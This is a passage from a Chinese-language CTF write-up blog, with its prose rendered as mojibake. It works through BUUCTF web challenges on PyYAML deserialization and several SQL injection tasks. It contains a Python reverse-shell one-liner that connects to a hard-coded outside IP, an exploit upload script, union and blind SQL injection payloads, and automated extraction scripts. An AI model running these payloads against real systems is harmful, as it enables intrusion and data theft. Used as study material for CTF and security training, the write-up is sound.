random.choice(sayings)</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ï¼Œä¼šç”¨yaml.loadå‡½æ•°æ¥åŠ è½½æ–‡ä»¶ï¼ˆå¯æ§ï¼‰ï¼Œé…åˆæ–‡ä»¶ä¸Šä¼ å¯ä»¥é€ æˆyamlååºåˆ—åŒ–æ¼æ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">yamlååºåˆ—åŒ–æ¼æ´</a></p><p>æ ¹æ®ä¸Šé¢æ–‡ç« ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ªpoc.yaml</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/module:static.upload</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª<code>__init__.py</code>æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,pty,socket;s=socket.socket();s.connect((<span class="string">&quot;120.77.73.212&quot;</span>,<span class="number">2333</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶è„šæœ¬</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>imgUpload()</code>ä¸­<code>file = request.files.get(&#39;editormd-image-file&#39;)</code>ä»¥åŠå¸¦ä¸Šsession</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1aef01d5-e675-4e45-9357-2524a3e5c570.node4.buuoj.cn:81/blog/imgUpload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (æ–‡ä»¶å,æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶MIME)  &#125;  å°†æ–‡ä»¶ä¿¡æ¯å¡«å…¥å…ƒç»„ï¼ˆï¼‰ä¸­ï¼Œåªæœ‰æ–‡ä»¶å†…å®¹æ˜¯å¿…é€‰çš„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#files = &#123;&quot;editormd-image-file&quot;: (&quot;__init__.py&quot;, open(&#x27;E:\scripts\poc.py&#x27;, &#x27;rb&#x27;))&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥ä¸Šä¼ æ–‡ä»¶å†…å®¹å­—ç¬¦ä¸²ï¼ˆæ³¨æ„è¦ç”¨äºŒè¿›åˆ¶ï¼‰</span></span><br><span class="line">files = &#123;<span class="string">&quot;editormd-image-file&quot;</span>: (<span class="string">&quot;poc.yaml&quot;</span>, <span class="string">b&#x27;!!python/module:static.upload&#x27;</span>)&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># bpä»£ç†</span></span><br><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8011&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span> : <span class="string">&#x27;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files,proxies=pro,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221105135517382-1687419303719.png" alt="image-20221105135517382"></p><p>ç„¶åæœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œè®¿é—®<code>/blog/saying?path=static/upload/poc.yaml</code>å³å¯</p><p><img src="/../images/image-20221105135258653-1687419303719.png" alt="image-20221105135258653"></p><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="å¼ºç½‘æ¯2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯2019]éšä¾¿æ³¨</h2><p>å‘Šè¯‰æˆ‘ä»¬æ³¨å…¥ç‚¹äº†</p><p>å‚æ•°ç±»å‹ï¼Œç”±è¯­æ³•é”™è¯¯å¯çŸ¥æ˜¯å•å¼•å·é—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•æ˜¯å †å æ³¨å…¥ï¼Œæ‰€ä»¥å…¶åç«¯sqlæŸ¥è¯¢ä½¿ç”¨çš„æ˜¯mysqli_multi_query() </p><p>å¹¶ä¸”æœ‰è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡show tablesçŸ¥é“è¡¨åï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨handleæ¥ç»•è¿‡selectï¼Œå¾—åˆ°è¡¨ä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>åªæœ‰ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œæ— æ³¨å†Œç•Œé¢ï¼Œç›®å½•æ‰«ææ— ç»“æœã€‚</p><p>æµ‹è¯•ä¸ºå•å¼•å·é—­åˆã€‚</p><p>åœ¨ç™»å½•åçš„search.phpæºä»£ç ä¸­æ‰¾åˆ°æ³¨é‡Šï¼Œç»è¿‡è§£ç å¾—åˆ°<code>select * from user where username = &#39;$name&#39;</code></p><p>çŒœæµ‹ç™»é™†ä¸Šå»å³å¯è·å¾—flag</p><p>é€šè¿‡è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·</p><p>username&#x3D;<code>1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#</code></p><p>passwd&#x3D;<code>1</code></p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯å‰é¢ä¸èƒ½ä¸ºadminâ€™ï¼Œä¸ç„¶å®ƒå°±ä¼šå»æ¯”è¾ƒåŸæ¥adminæ‰€å¯¹åº”çš„å¯†ç </p></blockquote><p>æˆåŠŸç™»å½•è·å¾—flagã€‚</p><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>joinæ³¨å†Œåï¼Œç‚¹å‡»usernameï¼Œå‘ç°urlå‚æ•°<code>view.php?no=1</code>ï¼Œå¯èƒ½å­˜åœ¨sqlæ³¨å…¥</p><p>è¿›è¡Œæµ‹è¯•ï¼Œ<code>1^0</code>é¡µé¢æŠ¥é”™ï¼Œæ‰€ä»¥å­˜åœ¨sqlæ³¨å…¥</p><p>åˆ¤æ–­å‚æ•°ç±»å‹ï¼Œå‘ç°ä¸ºæ•´å‹</p><p>è¿›è¡Œfuzzï¼Œå‘ç°<code>union select</code>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20220728125208126-1687489655110.png" alt="image-20220728125208126"></p><p>å°è¯•æ„é€ <code>union/**/select</code>ç»•è¿‡</p><p><img src="/../images/image-20220728125647157-1687489655112.png" alt="image-20220728125647157"></p><p>å‘ç°å¯ä»¥ç»•è¿‡ï¼Œä¸”å­—æ®µæ•°ä¸ä¸º3</p><p><img src="/../images/image-20220728125537515-1687489655113.png" alt="image-20220728125537515"></p><p>å‘ç°ååºåˆ—åŒ–å‡½æ•°ï¼Œå­—æ®µæ•°ä¸º4ï¼Œå¯åˆ©ç”¨çš„å­—æ®µåœ¨2ä½ç½®</p><blockquote><p>åˆ°è¿™é‡Œsqlæ³¨å…¥å°±æœ‰ä¸¤ä¸ªæ€è·¯ï¼Œä¸€æ˜¯è”åˆæ³¨å…¥(é¡µé¢æœ‰å›æ˜¾ç‚¹)ï¼ŒäºŒæ˜¯æŠ¥é”™æ³¨å…¥ï¼ˆé¡µé¢æœ‰æŠ¥é”™æ—¥å¿—ï¼Œè¿™é‡Œè¿‡æ»¤äº†0x7eï¼‰ã€‚</p></blockquote><p>æ¥ä¸‹æ¥æŒ‰ç…§æ­£å¸¸æ€è·¯åšå³å¯ã€‚</p><p>æœ€åæŸ¥å­—æ®µå€¼æ—¶ä¼šå‘ç°usersè¡¨çš„ç¬¬å››åˆ—dataä¸­å­˜æ”¾çš„æ˜¯ç»è¿‡åºåˆ—åŒ–åçš„ç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="/../images/image-20220728172644784-1687489655113.png" alt="image-20220728172644784"></p><p>å…³äºååºåˆ—åŒ–ï¼Œå°±ä¸€å®šè¦æœ‰æºç ã€‚</p><p>è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°user.php.bakï¼Œä»¥åŠflag.phpçš„å­˜åœ¨</p><p>ä¸»è¦å…³æ³¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">#ç”¨curlå¯¹åšå®¢åœ°å€å‘èµ·è¯·æ±‚ï¼Œå¹¶è·å–å†…å®¹</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">#åˆ©ç”¨fileåè®®è¯·æ±‚æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡ŒæŠŠå…¶æ”¾åœ¨ç¬¬å››åˆ—ï¼Œæ˜¯å› ä¸ºåšå®¢ä¿¡æ¯æ˜¯å­˜å‚¨åœ¨usersè¡¨çš„ç¬¬å››åˆ—dataä¸­çš„</p><p>èƒ½å¤ŸæˆåŠŸçš„åŸå› æ˜¯union&#x2F;**&#x2F;selectä¸åŠ è¡¨åçš„ç‰¹æ€§ï¼Œä¼šåœ¨å‰é¢çš„selectè¡¨ä¸­æ„é€ ä¸´æ—¶æ•°æ®ã€‚</p></blockquote><p>æœ€ååœ¨æºä»£ç blog contentéƒ¨åˆ†å¯ä»¥å¾—åˆ°flag.phpçš„å†…å®¹ã€‚</p><p><img src="/../images/image-20220728173710364-1687489655113.png" alt="image-20220728173710364"></p><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><p>åŸç†</p><blockquote><p>åœ¨mysqlä¸­+åªèƒ½å½“ä½œç®—æœ¯è¿ç®—ç¬¦ï¼Œä¸phpä¸­çš„+ç±»ä¼¼ ï¼Œå¯ä»¥è¿›è¡Œæ•°å­—å­—ç¬¦ä¸²+æ•°å­—çš„è®¡ç®—</p></blockquote><p><img src="/../images/image-20220717191455431-1687489655114.png" alt="image-20220717191455431"></p><p>å‰ç½®æ¡ä»¶</p><blockquote><p>æŸ¥è¯¢çš„ç»“æœåªæœ‰ä¸€åˆ—</p></blockquote><p><img src="/../images/image-20220718093833432-1687489655113.png" alt="image-20220718093833432"></p><p>è¿›å»æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä¸€èˆ¬å…ˆæ‰¾æ³¨å†Œç•Œé¢ï¼Œç™»å½•åå†æ‰¾æ³¨å…¥ç‚¹ã€‚</p><p>ç›´æ¥è®¿é—®url&#x2F;register.php</p><p>éœ€è¦å¡«ä¸‰ä¸ªä¿¡æ¯ï¼šé‚®ç®±ï¼Œç”¨æˆ·åï¼Œå¯†ç </p><p>ç™»å½•åï¼Œè§‚å¯Ÿåˆ°é¡µé¢åªæœ‰ä¸€ä¸ªå¯ç–‘ä¹‹å¤„,æ˜¾ç¤ºäº†ç”¨æˆ·å</p><p><img src="/../images/image-20220717182811431-1687489655115.png" alt="image-20220717182811431"></p><p>æ‰€ä»¥ï¼Œæ³¨å…¥ç‚¹åº”è¯¥æ˜¯åœ¨ç”¨æˆ·åå¤„ï¼Œä¸ºå›æ˜¾æ³¨å…¥ã€‚</p><blockquote><p>è¿™é‡Œå¯ä»¥çŒœæµ‹æ˜¾ç¤ºç”¨æˆ·åçš„åç«¯è¯­å¥ä¸º<code>select username from table where email=$email</code></p></blockquote><hr><p>å›åˆ°æ³¨å†Œç•Œé¢ç»§ç»­æµ‹è¯•ï¼ŒéªŒè¯æƒ³æ³•ã€‚</p><p>æ³¨å†Œç”¨æˆ·å1â€æ³¨å†ŒæˆåŠŸï¼Œç”¨æˆ·åä¸º1â€™æ—¶æ³¨å†Œå¤±è´¥</p><p><img src="/../images/image-20220717184809571-1687489655115.png" alt="image-20220717184809571"></p><blockquote><p>çŒœæµ‹æ³¨å†Œçš„sqlè¯­å¥ä¸º<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code>å•å¼•å·é—­åˆ</p></blockquote><p>è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œé‚®ç®±æ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœç”¨ç›¸åŒçš„é‚®ç®±æ³¨å†Œå¤šä¸ªè´¦å·åªæœ‰ç¬¬ä¸€ä¸ªè´¦å·æ˜¯å¯ä»¥ç™»é™†ä¸Šå»çš„ã€‚</p><p>è¿›è¡Œfuzz</p><p><img src="/../images/image-20220717185630970-1687489655114.png" alt="image-20220717185630970"></p><p>å‘ç°çº¢æ¡†å†…çš„è¢«è¿‡æ»¤</p><p>å› ä¸ºè¯­å¥ä¸º<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code></p><p>åªèƒ½ä½¿ç”¨è¿ç®—ç›²æ³¨ï¼ˆå…¶ä»–çš„æ„é€ ä¸äº†ï¼‰</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="comment">#é‚®ç®±æ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœç”¨ç›¸åŒçš„é‚®ç®±æ³¨å†Œå¤šä¸ªè´¦å·åªæœ‰ç¬¬ä¸€ä¸ªè´¦å·æ˜¯å¯ä»¥ç™»é™†ä¸Šå»çš„ã€‚æ‰€ä»¥æ¯æ¬¡æ³¨å†Œé‚®ç®±éƒ½è¦ä¸åŒ</span></span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from &#123;&#125; for 1)) + &#x27;0&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res_ = requests.post(url=login_url, data=login_data)</span><br><span class="line">    code = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(code.group(<span class="number">1</span>)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ip <span class="keyword">from</span> ip_table</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(isset($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$last_ip <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> query(&quot;select current_ip, last_ip from ip_log where uuid = &#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">if(<span class="built_in">count</span>($<span class="keyword">result</span>) <span class="operator">&gt;</span> <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    if($ip <span class="operator">!=</span><span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>]) &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        query(&quot;delete from ip_log where uuid=&#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;last_ip&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query(&quot;insert into ip_log values (&#x27;&quot;.addslashes($uuid).&quot;&#x27;, &#x27;&quot;.addslashes($ip).&quot;&#x27;, &#x27;$last_ip&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è¡¨ä¸­æ— æ•°æ®ï¼Œif(count($result) &gt; 0)ä¸æˆç«‹ï¼Œ$ip&#x3D;x-forwarded-for1  $last_ip&#x3D;ç©º,æ’å…¥ip_logè¡¨ä¸­</p><p>ç¬¬äºŒæ¬¡ è¡¨ä¸­æœ‰æ•°æ®ï¼Œif(count($result) &gt; 0) æˆç«‹ï¼Œ$ip&#x3D;x-forwarded-for2    $last_ip&#x3D;x-forwarded-for1 ,åˆ é™¤ç¬¬ä¸€æ¬¡æ’å…¥çš„æ•°æ®ï¼Œæ’å…¥ç¬¬äºŒæ¬¡æ•°æ®ã€‚</p><p>ç¬¬ä¸‰æ¬¡è¡¨ä¸­æœ‰æ•°æ®, æŸ¥è¯¢æ—¶ä¼šç”¨åˆ°x-forwarded-for1ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨ç‚¹</p><blockquote><p>ä¸çœ‹æºç ï¼Œæ¨ä¸å‡ºæ¥</p><p>ä¸‹æ¬¡å¦‚æœçŒœæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œåƒè¿™ä¸ªå°±æ˜¯ç¬¬ä¸‰æ¬¡æ‰§è¡Œ</p></blockquote><p>å•å¼•å·é—­åˆ</p><p>ç¬¬ä¸€æ¬¡è¾“å…¥<code>1&#39; or &#39;1</code></p><p>ç¬¬äºŒæ¬¡è¾“å…¥1</p><p>ç¬¬ä¸‰æ¬¡è¾“å…¥1</p><p><img src="/../images/image-20220812122454399-1687489655115.png" alt="image-20220812122454399"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬¡çš„è¾“å…¥æ‰§è¡Œäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26803/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table</span>():</span><br><span class="line">    table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#æ§åˆ¶é•¿åº¦</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right =<span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:payload,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># data=&#123;</span></span><br><span class="line">            <span class="comment">#     &#x27;id&#x27;:payload,</span></span><br><span class="line">            <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,params=data)</span></span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line"></span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># å­—ç¬¦ä¸²ä¸ºæˆåŠŸçš„æ ‡å¿—</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># é˜²æ­¢429</span></span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        table+=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_table()</span><br></pre></td></tr></table></figure><h2 